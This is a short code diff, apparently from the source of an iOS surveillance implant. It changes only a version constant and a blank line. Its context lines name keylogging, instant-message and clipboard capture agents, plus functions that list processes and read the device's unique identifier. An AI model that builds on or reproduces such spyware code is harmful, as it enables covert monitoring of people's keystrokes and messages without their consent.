@@ -81,7 +81,7 @@ u_int remoteAgents[8] = { OFFT_KEYLOG,
                           OFFT_IM,
                           OFFT_CLIPBOARD };
 
-u_int gVersion      = 2012013101;
+u_int gVersion      = 2012041501;
 
 int getBSDProcessList (kinfo_proc **procList, size_t *procCount)
 {
@@ -307,8 +307,8 @@ NSString *getHostname ()
 //
 NSString *getSystemSerialNumber()
 {
+
   NSString *id = [[UIDevice currentDevice] uniqueIdentifier];
-  
   return id;
 }
 
